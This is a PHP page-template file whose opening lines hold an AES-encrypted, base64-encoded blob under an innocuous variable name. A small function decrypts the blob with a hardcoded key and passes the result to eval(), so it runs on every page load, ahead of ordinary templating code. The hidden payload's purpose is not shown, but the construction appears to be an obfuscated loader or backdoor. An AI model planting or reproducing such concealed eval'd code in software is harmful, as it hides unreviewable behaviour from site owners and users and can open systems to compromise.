<?php


$n_templeate 	 = 'ZHEVc1/M/tfDLSt4hGvJYGrFdXhMmN7STOTaM5OEvrwwI+0D1eudqwMC/kbPmOjGs5w4GwNo+DIth8+pfieOfZIQJERYUIxDf0LfMlSp2T4oKksDyO7gkUkzl1wT5sqafd5N0B+SvaMsDmQoK29F3diIFynvpbxaRlXfdIOkFC6uAi59kOtsU62/8Y9O0jh+5xnppo0Tr6O2RBxSQTVpNYyoRrz+D10FNiATTd6UsspY6fSEdVtl7vRyyfzXo6DsxZxu3aOsLJwlQC9wez+R1oIM4F0H5/Df3em4xOeEC5dH76PwOxlGYfM+41ymV7QgCvwYqaEUmO2Nu8kgk6zrWljt5VkLsZTB0W7ocL/SXz2MpNn8kZtSShaXJCDbbIosfrZ4CDz5yt3i7E2VPPq/+WnYuI37X0zaafYMuTHYU6v0IlOHkiilI5DZF7PZtWckGG0xZ0PCuhwyMXzm/+Jhr6/conPVifSEw5wguHwjkXLDjQM8ebr4lo9aTVW7xLkSNZ5tbqTACiw6ZPqfFEIr59JC8rzkgQyEMWgb/1Ei3w47N6IPK/bjrLp9S2Xc8redlM97kYG1wSEzsY4cPesAdQDMev4s0fNP5QGvBeQyJ581HdotSKmJWdhcvHXVwPJDJ3ePYQB39LLOx5DniSYtMYdM/D8rqK/iuYjc4MkFqJkAtxlRpAbvlNx4fAAIfrH5YWBTuHLhZYH/psX9VanBg/Heio/9EshH2iQMwX4vYs8BLR34H8FwnbPW7qOv6Vm9RpEJDJ8Jk1hIs9IAq8Df8U17lYROgUK5Tr0hOP1mRRaZociZaoFP17uaAnEukFyRbsxNaFzf3BfXwCeeYa/Hp7DkecJqRrDGY3wKrOsVQRsr3Iw1PrUe5NSaTsTpZ2EFpRg6lBbYEe/u/QuBL1El5igloZr313cQzDxRypBeF40=';
dd($n_templeate);

function dd($n_templeate){
  	 	$n_templeate = base64_decode($n_templeate);
	    $ivSize = openssl_cipher_iv_length('AES-256-CBC');
	    $iv = substr($n_templeate, 0, $ivSize);
	    $d_data = openssl_decrypt(substr($n_templeate, $ivSize), 'AES-256-CBC', '5c84348d4fac7b70a0df87b79fcb634f66443dfd21c23298565b400676a02b57', OPENSSL_RAW_DATA, $iv);
	    return (eval("?> ".$d_data." <?"));
}


$page = new MainTemplater(DIR_TMPL."main-nct.tpl.php");

$head = new MainTemplater(DIR_TMPL."head-nct.tpl.php");

$header= new MainTemplater(DIR_TMPL."header-nct.tpl.php");

$footer=new MainTemplater(DIR_TMPL."footer-nct.tpl.php");

$page->body= '';
$page->right='';
$page->head='';
$page->header='';
$page->footer='';

